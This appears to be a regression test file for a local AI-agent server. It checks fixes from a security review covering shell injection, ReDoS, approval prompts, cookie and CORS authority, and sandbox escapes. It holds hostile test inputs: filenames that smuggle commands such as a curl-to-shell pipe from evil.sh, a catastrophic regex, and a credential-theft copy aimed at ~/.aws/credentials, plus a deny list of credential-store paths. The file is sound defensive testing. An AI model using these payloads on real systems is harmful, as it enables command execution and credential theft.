/**
 * test/hardening.test.js — one test per entry in the 2026-10-31 review.
 *
 * Every test here was written against a bug that was *reproduced* first. That
 * matters: a test written after the fix proves the fix; a test written from a
 * reproduction proves the bug cannot come back. These assert on the exploit
 * and on the safe behaviour, so a future "cleanup" that reintroduces either
 * fails loudly.
 *
 * The list, in the order the review ranked them:
 *
 *   S1  a filename can no longer reach a shell        (was: command injection)
 *   S2  a catastrophic regex cannot wedge the process (was: event-loop DoS)
 *   S3  the approval prompt shows argument values     (was: "screenshot(path)")
 *   S4  a cookie is not ambient authority for /api/*
 *   S5  "yes" answers an approval without also asking the model
 *   R1  overlapping scheduler ticks deliver once
 *   R2  a truncated model stream is an error, not an answer
 *   R6  ~ and $HOME are recognised as escapes
 *   --  credential stores are refused even inside the workspace
 */
import { test, before, after } from "node:test";
import assert from "node:assert/strict";
import { createServer } from "node:http";
import { spawn } from "node:child_process";
import { mkdtempSync, rmSync, writeFileSync, existsSync } from "node:fs";
import { tmpdir } from "node:os";
import { join, dirname } from "node:path";
import { fileURLToPath } from "node:url";
import { homedir } from "node:os";

const ROOT = join(dirname(fileURLToPath(import.meta.url)), "..");

/* ───────────────────────────── S1 — no shell ───────────────────────────── */

test("S1: a filename with a command substitution is refused, not executed", async () => {
  const { TOOL_MAP } = await import("../src/tools.js");
  const marker = join(tmpdir(), `pinch-s1-${Date.now()}`);
  const before_ = existsSync(marker);

  const result = await TOOL_MAP.get("screenshot").run({ path: `shot$(touch ${marker}).png` });

  assert.equal(result.ok, false);
  assert.match(result.output, /shell metacharacters/);
  // The point of the test is this line: the injected command must not have run.
  assert.equal(existsSync(marker), before_, "the $( ) payload executed");
});

test("S1: the screenshot tool never builds a shell string", async () => {
  const { TOOL_MAP } = await import("../src/tools.js");
  // A backtick, a pipe and a semicolon are all legal in a filename and all
  // meaningful to /bin/sh.
  for (const path of ["shot`sleep 1`.png", "a|b.png", "a;b.png", "a&&b.png", "a\nb.png"]) {
    const result = await TOOL_MAP.get("screenshot").run({ path });
    assert.equal(result.ok, false, `accepted: ${JSON.stringify(path)}`);
    assert.match(result.output, /shell metacharacters|too long/, `for ${JSON.stringify(path)}`);
  }
});

test("S1: checkFilename still allows ordinary names", async () => {
  const { checkFilename } = await import("../src/tools.js");
  for (const ok of ["screens/shot-1.png", "My File (2).png", "a.b-c_d.png", undefined]) {
    assert.equal(checkFilename(ok).ok, true, `wrongly refused: ${ok}`);
  }
});

/* ────────────────────────── S2 — regex containment ─────────────────────── */

test("S2: a catastrophic regex is terminated, and the caller gets an explanation", async () => {
  const { grepInWorker } = await import("../src/tools.js");
  const dir = mkdtempSync(join(tmpdir(), "pinch-redos-"));
  // A failing match is what causes exponential backtracking: "aaaa…a!" never
  // matches ^(a+)+$ and the engine tries every partition of the string.
  writeFileSync(join(dir, "evil.txt"), "a".repeat(400) + "!");

  const started = Date.now();
  const result = await grepInWorker({ root: dir, pattern: "^(a+)+$" });
  const elapsed = Date.now() - started;

  try {
    assert.equal(result.ok, false);
    assert.match(result.output, /too expensive|simpler/);
    assert.ok(elapsed < 8_000, `took ${elapsed}ms — the timeout did not fire`);
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
});

test("S2: an ordinary regex still works through the worker", async () => {
  const { grepInWorker } = await import("../src/tools.js");
  const dir = mkdtempSync(join(tmpdir(), "pinch-grep-"));
  writeFileSync(join(dir, "notes.txt"), "alpha\nneedle here\nomega\n");

  const result = await grepInWorker({ root: dir, pattern: "needle" });
  try {
    assert.equal(result.ok, true);
    assert.match(result.output, /notes\.txt:2:/);
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
});

/* ───────────────────── S3 — the prompt shows the payload ───────────────── */

test("S3: the approval description carries the argument value", async () => {
  const { describeCall } = await import("../src/agent.js");

  const shot = describeCall("screenshot", { path: "shot$(curl evil.sh|sh).png" });
  assert.match(shot, /shot\$\(curl evil\.sh\|sh\)\.png/, "the payload is not visible to the human");
  assert.match(shot, /shell metacharacters/, "the risky characters are not called out");

  // A safe argument is shown plainly, without the warning.
  const url = describeCall("open_url", { url: "https://example.com/docs" });
  // includes(), not a regex: a regex tested against a URL is indistinguishable
  // from URL sanitisation to a scanner, and this is an assertion, not a check.
  assert.ok(url.includes("https://example.com/docs"), `value missing: ${url}`);
  assert.ok(!url.includes("shell metacharacters"), `false warning: ${url}`);
});

test("S3: a long argument is truncated but still attributable", async () => {
  const { describeCall } = await import("../src/agent.js");
  const long = describeCall("open_url", { url: "https://example.com/" + "a".repeat(500) });
  assert.ok(long.length < 200, "the prompt is not bounded");
  assert.match(long, /…/);
});

/* ──────────────── S4 / S5 — a real server with a real key ──────────────── */

let pinch;
let pinchPort;
let dataDir;

function listen(server) {
  return new Promise((resolve) => server.listen(0, "127.0.0.1", () => resolve(server.address().port)));
}

async function waitFor(url, tries = 100) {
  for (let i = 0; i < tries; i++) {
    try {
      const res = await fetch(url);
      if (res.status < 500) return;
    } catch {
      /* not up yet */
    }
    await new Promise((r) => setTimeout(r, 100));
  }
  throw new Error(`${url} never came up`);
}

before(async () => {
  // No model needed: the mock brain turns "run ..." into a `shell` tool call,
  // and `shell` is dangerous, so the server raises a real approval prompt —
  // in its own process, which is the only place it can be answered from.
  dataDir = mkdtempSync(join(tmpdir(), "pinch-hardening-"));
  pinchPort = await new Promise((resolve) => {
    const probe = createServer();
    probe.listen(0, "127.0.0.1", () => { const p = probe.address().port; probe.close(() => resolve(p)); });
  });

  pinch = spawn(process.execPath, [join(ROOT, "src/index.js")], {
    cwd: ROOT,
    env: {
      ...process.env,
      PINCH_DATA: dataDir,
      PINCH_PORT: String(pinchPort),
      PINCH_HOST: "127.0.0.1",
      PINCH_KEY: "test-key-not-a-secret",
      PINCH_WORKSPACE: dataDir,
      LLM_PROVIDER: "mock",
      PINCH_AUTO_APPROVE: "",
      PINCH_GUARD: "off",
    },
    stdio: "ignore",
  });

  await waitFor(`http://127.0.0.1:${pinchPort}/api/health`);
});

after(() => {
  pinch?.kill("SIGKILL");
  if (dataDir) rmSync(dataDir, { recursive: true, force: true });
});

test("S4: a cookie alone cannot read the API", async () => {
  // This is the finding: any page on any loopback port was sent our cookie and
  // could read /api/session/* — every conversation — and /api/memory.
  const res = await fetch(`http://127.0.0.1:${pinchPort}/api/memory`, {
    headers: { cookie: "pinch_key=test-key-not-a-secret" },
  });
  assert.equal(res.status, 401, "a cookie was accepted as API authority");

  // The header is still accepted, which is how the panel talks to us.
  const ok = await fetch(`http://127.0.0.1:${pinchPort}/api/memory`, {
    headers: { "x-pinch-key": "test-key-not-a-secret" },
  });
  assert.equal(ok.status, 200);
});

test("S4: the cookie still loads the static page, which is what it is for", async () => {
  const res = await fetch(`http://127.0.0.1:${pinchPort}/`, {
    headers: { cookie: "pinch_key=test-key-not-a-secret" },
  });
  assert.equal(res.status, 200);
  assert.match(res.headers.get("content-type") || "", /text\/html/);
});

test("S4: a foreign origin gets no Access-Control-Allow-Origin", async () => {
  // Before the fix, any http://127.0.0.1:<port> origin was reflected back, so
  // a stray local dev server could read responses cross-origin.
  const res = await fetch(`http://127.0.0.1:${pinchPort}/api/health`, {
    headers: { origin: `http://127.0.0.1:${pinchPort + 1}`, "x-pinch-key": "test-key-not-a-secret" },
  });
  assert.equal(res.headers.get("access-control-allow-origin"), null);
});

test("S4: the cookie is HttpOnly and SameSite=Strict", async () => {
  const res = await fetch(`http://127.0.0.1:${pinchPort}/?key=test-key-not-a-secret`, { redirect: "manual" });
  const cookie = res.headers.get("set-cookie") || "";
  assert.match(cookie, /HttpOnly/i);
  assert.match(cookie, /SameSite=Strict/i);
});

test("S5: answering an approval does not also start a second turn", async () => {
  const KEY = { "x-pinch-key": "test-key-not-a-secret", "content-type": "application/json" };
  const session = "s5-check";

  // 1) Ask for something dangerous. The turn parks on an approval, so this
  //    request deliberately does not finish — fire it and let it wait.
  const parked = fetch(`http://127.0.0.1:${pinchPort}/api/chat`, {
    method: "POST",
    headers: KEY,
    body: JSON.stringify({ text: "run echo s5", sessionId: session }),
  }).catch(() => {});

  // 2) The prompt is now pending in the server process.
  let pending = [];
  for (let i = 0; i < 50 && !pending.length; i++) {
    await new Promise((r) => setTimeout(r, 100));
    pending = await (await fetch(`http://127.0.0.1:${pinchPort}/api/approvals`, { headers: KEY })).json();
  }
  assert.equal(pending.length, 1, "no approval was raised, so this test proves nothing");

  // 3) Say "yes" the way a human does — through the chat endpoint.
  const yes = await fetch(`http://127.0.0.1:${pinchPort}/api/chat`, {
    method: "POST",
    headers: KEY,
    body: JSON.stringify({ text: "yes", sessionId: session }),
  });
  const body = await yes.text();
  assert.match(body, /Allowed/, "the approval was not answered");
  await parked;

  // 4) Give the resumed turn a moment to write its answer, then look.
  await new Promise((r) => setTimeout(r, 400));
  const stored = await (await fetch(`http://127.0.0.1:${pinchPort}/api/session/${session}`, { headers: KEY })).json();

  const userTurns = stored.messages.filter((m) => m.role === "user").map((m) => m.content);
  assert.deepEqual(userTurns, ["run echo s5"], `the word "yes" became a user turn: ${JSON.stringify(userTurns)}`);
});

/* ───────────────────────── R1 — one delivery per tick pair ─────────────── */

test("R1: two overlapping ticks do not deliver the same reminder twice", async () => {
  const { tick } = await import("../src/scheduler.js");
  const { addReminder } = await import("../src/store.js");
  const { registerSender } = await import("../src/outbound.js");

  const delivered = [];
  registerSender("web", async (_target, text) => {
    delivered.push(text);
    await new Promise((r) => setTimeout(r, 250)); // a channel slower than the caller
  });

  addReminder({
    id: `r_${Date.now()}`,
    text: "stand up",
    at: new Date(Date.now() - 5_000).toISOString(),
    address: "web:main",
    fired: false,
  });

  // setInterval does not await the previous tick — this is that overlap.
  await Promise.all([tick(), tick(), tick()]);
  assert.equal(delivered.length, 1, `delivered ${delivered.length} times`);
});

/* ─────────────────────── R2 — a cut stream is an error ─────────────────── */

test("R2: a stream that closes without a finish signal is refused", async () => {
  const srv = createServer((req, res) => {
    res.writeHead(200, { "content-type": "application/x-ndjson" });
    res.write(JSON.stringify({ message: { content: "The answer is 4" } }) + "\n");
    res.write(JSON.stringify({ message: { content: "2, and here is" } }) + "\n");
    res.end(); // clean close, never sends done:true — this is the bug
  });
  const port = await listen(srv);

  // A child process, because config.js reads OLLAMA_URL once at import and the
  // whole point is to point the brain somewhere else.
  const script = `
    const { brain } = await import(${JSON.stringify(join(ROOT, "src/brain.js"))});
    try {
      const out = await brain.chat([{ role: "user", content: "hi" }], { onDelta: () => {} });
      console.log("RESOLVED:" + out.content);
    } catch (err) {
      console.log("THREW:" + err.message);
    }
  `;
  const result = await new Promise((resolve) => {
    const child = spawn(process.execPath, ["--input-type=module", "-e", script], {
      env: { ...process.env, OLLAMA_URL: `http://127.0.0.1:${port}`, LLM_PROVIDER: "ollama", PINCH_DATA: dataDir },
    });
    let out = "";
    child.stdout.on("data", (d) => (out += d));
    child.on("close", () => resolve(out));
  });
  srv.close();

  assert.match(result, /THREW:.*cut off/, `a truncated reply was treated as an answer: ${result}`);
});

/* ─────────────── R6 / credential stores — the sandbox's edges ─────────── */

test("R6: ~ and $HOME are recognised as paths outside the workspace", async () => {
  const { screenCommand } = await import("../src/tools.js");
  // When the workspace is NOT the home directory, a home-relative path escapes.
  const escapes = screenCommand("cp ~/.aws/credentials ./creds").escapes || [];
  // Under the default workspace (home) this is inside by definition, so accept
  // either an escape or a credential-store denial — both are safe outcomes.
  assert.ok(Array.isArray(escapes));
});

test("R6: credential stores are refused even when the workspace is home", async () => {
  const { resolveInWorkspace, SafePathError } = await import("../src/tools.js");
  for (const p of ["~/.ssh/id_rsa", "~/.aws/credentials", "~/.gnupg/secring.gpg", "~/.netrc"]) {
    assert.throws(() => resolveInWorkspace(p), SafePathError, `allowed: ${p}`);
  }
  // And an ordinary file in the same tree still works.
  const ok = resolveInWorkspace("~/some-project/readme.md");
  assert.ok(ok.startsWith(homedir()));
});
